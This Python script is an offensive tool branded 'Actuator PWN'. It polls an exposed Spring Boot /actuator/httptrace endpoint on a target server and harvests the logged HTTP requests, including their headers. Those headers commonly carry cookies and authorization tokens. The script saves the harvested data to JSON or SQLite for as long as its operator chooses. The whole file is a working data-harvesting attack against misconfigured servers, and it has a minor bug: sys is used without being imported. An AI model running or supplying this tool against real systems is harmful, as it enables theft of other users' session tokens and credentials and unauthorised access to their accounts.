import requests
import time
import json
import argparse
import sqlite3
import os
from datetime import datetime
import random
import string
from urllib.parse import urlparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Ensure the Output directory exists
OUTPUT_DIR = "Output"
os.makedirs(OUTPUT_DIR, exist_ok=True)

class ActuatorFetcher:
    def __init__(self, url, interval, save_option, filename=None, runtime=None):
        self.url = url
        self.interval = interval
        self.save_option = save_option
        self.filename = os.path.join(OUTPUT_DIR, filename or self.generate_random_filename())
        self.runtime_seconds = self.parse_runtime(runtime) if runtime else None
        self.start_time = None

    @staticmethod
    def generate_random_filename(prefix="requests", extension="json"):
        """Generates a randomized filename with a timestamp."""
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"{prefix}_{timestamp}_{random_suffix}.{extension}"

    @staticmethod
    def parse_runtime(runtime_str):
        """Parses a natural language runtime string into seconds."""
        runtime_str = runtime_str.lower()
        try:
            value = float(runtime_str.split()[0])  # Allow fractional values
        except ValueError:
            raise ValueError("Invalid runtime format. Use 'X minutes', 'X hours', or 'X days'.")

        if "minute" in runtime_str:
            return int(value * 60)
        elif "hour" in runtime_str:
            return int(value * 3600)
        elif "day" in runtime_str:
            return int(value * 86400)
        else:
            raise ValueError("Invalid runtime format. Use 'X minutes', 'X hours', or 'X days'.")

    def save_to_json(self, request_data):
        """Saves request data to a JSON file."""
        with open(self.filename, "a") as file:
            file.write(json.dumps(request_data, indent=4) + "\n")

    def save_to_db(self, request_data):
        """Saves request data to an SQLite database."""
        conn = sqlite3.connect(self.filename)
        cursor = conn.cursor()

        # Create table if it doesn't exist
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS requests (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                method TEXT,
                url TEXT,
                headers TEXT,
                custom_request_attributes TEXT
            )
        """)

        # Extract fields
        method = request_data.get("method", "N/A")
        uri = request_data.get("uri", "N/A")
        headers = json.dumps(request_data.get("headers", {}))
        other_keys = json.dumps({k: v for k, v in request_data.items() if k not in ["method", "uri", "headers"]})

        # Use the full URI as the URL
        full_url = uri

        # Insert into the database
        cursor.execute("""
            INSERT INTO requests (method, url, headers, custom_request_attributes)
            VALUES (?, ?, ?, ?)
        """, (method, full_url, headers, other_keys))

        conn.commit()
        conn.close()

    def fetch_traces(self):
        """Fetches data from the /actuator/httptrace endpoint and processes it."""
        try:
            # Check if the URL is reachable and contains valid data
            response = requests.get(self.url, timeout=5)
            response.raise_for_status()  # Raise an error for HTTP status codes 4xx/5xx

            # Parse the JSON response
            data = response.json()
            if "traces" not in data or not isinstance(data["traces"], list):
                print(Fore.RED + "[-] The URL doesn't seem to be a valid actuator httptrace output.")
                return

            print(Fore.GREEN + f"[+] Saving requests to: {self.filename}")

            # Monitor the endpoint at the specified interval
            self.start_time = time.time()
            while True:
                # Stop if runtime exceeds the specified time
                if self.runtime_seconds and (time.time() - self.start_time) >= self.runtime_seconds:
                    print(Fore.YELLOW + "[!] Runtime completed. Stopping the script.")
                    break

                response = requests.get(self.url, timeout=5)
                response.raise_for_status()
                data = response.json()

                # Process and save the 'request' dictionary
                for trace in data.get("traces", []):
                    request_data = trace.get("request", {})
                    if request_data:
                        # Save based on the selected option
                        if self.save_option == "json":
                            self.save_to_json(request_data)
                        elif self.save_option == "db":
                            self.save_to_db(request_data)

                        # Display the value of request.uri
                        uri = request_data.get("uri", "N/A")
                        print(Fore.CYAN + f"[+] Request URI: {uri}")

                time.sleep(self.interval)

        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"[-] Error fetching data from the URL: {e}")
        except KeyboardInterrupt:
            print(Fore.YELLOW + "[!] Monitoring stopped by user.")

    def run(self):
        self.fetch_traces()


def print_logo():
    logo = f"""
{Fore.CYAN}

                 _                  _                _____ __          __ _   _ 
     /\         | |                | |              |  __ \\ \        / /| \ | |
    /  \    ___ | |_  _   _   __ _ | |_  ___   _ __ | |__) |\ \  /\  / / |  \| |
   / /\ \  / __|| __|| | | | / _` || __|/ _ \ | '__||  ___/  \ \/  \/ /  | . ` |
  / ____ \| (__ | |_ | |_| || (_| || |_| (_) || |   | |       \  /\  /   | |\  |
 /_/    \_\\___| \__| \__,_| \__,_| \__|\___/ |_|   |_|        \/  \/    |_| \_|                         
{Fore.YELLOW}
{Fore.RED}  Actuator PWN v1.0
{Fore.YELLOW}  by @mahmoud0x00
{Style.RESET_ALL}
"""
    print(logo)


if __name__ == "__main__":
    print_logo()

    parser = argparse.ArgumentParser(description="Monitor /actuator/httptrace endpoint.")
    parser.add_argument("url", help="The URL of the /actuator/httptrace endpoint.")
    parser.add_argument(
        "--interval",
        type=float,
        default=10,
        help="Time interval (in seconds) between fetches. Default is 10 seconds.",
    )
    parser.add_argument(
        "--save",
        choices=["json", "db"],
        help="Save requests to a JSON file or SQLite database.",
        default="json",
        required=False
    )
    parser.add_argument(
        "--filename",
        help="Specify a custom filename for saving requests. If not provided, a randomized filename will be generated.",
    )
    parser.add_argument(
        "--runtime",
        help="Specify how long the script should run (e.g., '10 minutes', '2 hours', '1 day').",
    )

    args = parser.parse_args()

    if args.interval <= 0:
        print(Fore.RED + "[-] Interval must be a positive number.")
        sys.exit(1)

    fetcher = ActuatorFetcher(
        url=args.url,
        interval=args.interval,
        save_option=args.save,
        filename=args.filename,
        runtime=args.runtime
    )
    fetcher.run()